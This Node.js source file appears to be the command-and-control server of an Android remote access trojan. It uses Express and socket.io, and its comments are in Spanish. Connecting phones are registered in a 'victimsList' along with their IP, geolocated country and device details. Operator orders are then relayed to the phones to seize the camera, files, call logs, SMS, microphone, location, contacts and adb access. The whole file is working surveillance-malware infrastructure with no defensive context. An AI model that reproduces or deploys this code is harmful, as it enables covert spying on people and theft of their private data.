var express = require('express')
var bodyParser = require('body-parser');
var io = require('socket.io');
var geoip = require('geoip-lite');
var victimsList = require('./app/assets/js/model/Victim');
module.exports = victimsList;
var browserId;
var victimId;

/*CONSTANTES*/
var order = 'order';
var orders = {
    camera: 'x0000ca',
    fileManager: 'x0000fm',
    calls: 'x0000cl',
    sms: 'x0000sm',
    mic: 'x0000mc',
    location: 'x0000lm',
    contacts: 'x0000cn',
	adb: 'x0000ac',
};

var IO;

var app = express()

app.use(express.static('app'));

var server = app.listen(8080);

app.use(bodyParser.json()); // support json encoded bodies
app.use(bodyParser.urlencoded({ extended: true })); // support encoded bodies

//app.post('/listenport', function(req, res) {
/*app.post('/listenport', function(pIn, pOut) {
    var port = pIn.body.port;
	
	console.log("Puerto " + port);
	
	IO = io.listen(port);
	
	IO.sockets.pingInterval = 10000;
	
	IO.sockets.on('connection', function(socket) {
		console.log("Nueva Conexion");
	});
    //pOut.send('Open port' + ' ' + port);
	
	IO.sockets.on('news', (data, callback) => {
	  
	});
});*/

IO = io.listen(42474);
	
IO.sockets.pingInterval = 10000;

IO.sockets.on('connection', function(socket) {
		//console.log("Nueva Conexion");
	
		var address = socket.request.connection;
		var query = socket.handshake.query;
		var index = query.id;
		
		if(query.web == undefined){
			
			/*console.log("Agregando a Lista");
			console.log("Web1 : " +query.web);*/
			
			var ip = address.remoteAddress.substring(address.remoteAddress.lastIndexOf(':') + 1);
			var country = null;
			var geo = geoip.lookup(ip);
			if (geo)
			country = geo.country.toLowerCase();
			
			victimsList.addVictim(socket, ip, address.remotePort, country, query.manf, query.model, query.release, query.id);
			
			victimId = socket.id;
			
			if(browserId != undefined){
				//socket.broadcast.emit('enviarListado', victimId);	
				IO.to(browserId).emit('enviarListado', victimId);
			}
			//console.log(victimId);
		}else{
			browserId = socket.id;
			/*console.log("Enviando al browser");
			console.log("Web2 : " +query.web);*/
			
			//socket.to(browserId).emit('enviarListado', victimId);
			if(victimId != undefined){
				//socket.emit('enviarListado', victimId);	
				IO.to(browserId).emit('enviarListado', victimId);
			}
			
			//IO.sockets.emit('enviarListado', victimId);
			/*console.log("browserId " + browserId);
			console.log("victimId " + victimId);*/
		}
		
		//Enviando Orden a Android
		socket.on('order', (data, callback) => {
			//console.log('linea 93 ' + data.idsocket + " orden " + data.order  +  "  Extra " + data.extra);
			//socket.broadcast.emit('order', {order:'x0000ca', extra: 'camList'});
		    //console.log("Orden: " + data.order);
			//console.log("Extra: " + data.extra);
			IO.to(victimId).emit('order', {order:data.order, extra: data.extra});
		});
		
		//Escuchando Respuesta
		socket.on('x0000ca', (data, callback) => {
			console.log('Devolviendo al browser 1');
			//socket.emit('x0000ca', {data:data});
			IO.to(browserId).emit('x0000ca', {data});
		});
});

/*https://stackoverflow.com/questions/44746534/send-messages-from-server-expressjs-routing-to-client*/
/*router.post('/message/sendMessage', function (req, res, next) {
    console.log("router.post /message/sendMessage");
    var io = req.app.get('socketio');
    io.emit("message", "hi!");
    res.json("hahaha")
});*/




/*
IO.sockets.on('connection', function(socket) {

	var address = socket.request.connection;
	var query = socket.handshake.query;
	var index = query.id;
	
	if(query.web != true){
		var ip = address.remoteAddress.substring(address.remoteAddress.lastIndexOf(':') + 1);
		var country = null;
		var geo = geoip.lookup(ip);
		if (geo)
		country = geo.country.toLowerCase();

		victimsList.addVictim(socket, ip, address.remotePort, country, query.manf, query.model, query.release, query.id);
	}else{
		browserId = socket.id;
		
		socket.to(browserId).emit('victimList', victimsList);
	}

	socket.on('sendMsg', (id, msg) => {
		socket.to(id).emit('my message', msg);
	});
	
	socket.on(camera, (id, msg) => {
		socket.to(browserId).emit('my message', msg);
	});
	
	socket.on('disconnect', function() {
		victimsList.rmVictim(index);
	});
});
*/
